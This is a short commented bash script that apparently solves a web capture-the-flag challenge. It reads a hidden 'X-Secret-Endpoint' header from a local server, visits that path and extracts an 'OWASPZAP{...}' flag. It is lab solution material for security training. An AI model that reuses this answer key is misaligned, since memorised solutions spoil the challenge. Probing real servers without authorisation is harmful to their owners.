#! /bin/bash

# The server IP address. If not given, use 127.0.0.1 (localhost)
IP=${1:-127.0.0.1}

# The server port. If not given, use 42003
PORT=${2:-42003}

echo "Checking headers on the main page..."

# curl -sI makes a request to the server and shows only the response headers
# grep looks for the line that contains X-Secret-Endpoint
# awk picks the second word of that line, which is the path
# tr removes the newline character at the end
SECRET_PATH=$(curl -sI "http://$IP:$PORT/" | grep -i "X-Secret-Endpoint" | awk '{print $2}' | tr -d '\r')

# If the header was not found, stop and show an error
if [ -z "$SECRET_PATH" ]; then
  echo "X-Secret-Endpoint header not found. Is the server running?"
  exit 1
fi

echo "Header found: X-Secret-Endpoint -> $SECRET_PATH"
echo "Visiting http://$IP:$PORT$SECRET_PATH ..."

# curl -s visits the secret page and grep extracts the flag from the response
FLAG=$(curl -s "http://$IP:$PORT$SECRET_PATH/" | grep -o "OWASPZAP{[^}]*}")

echo "FLAG: $FLAG"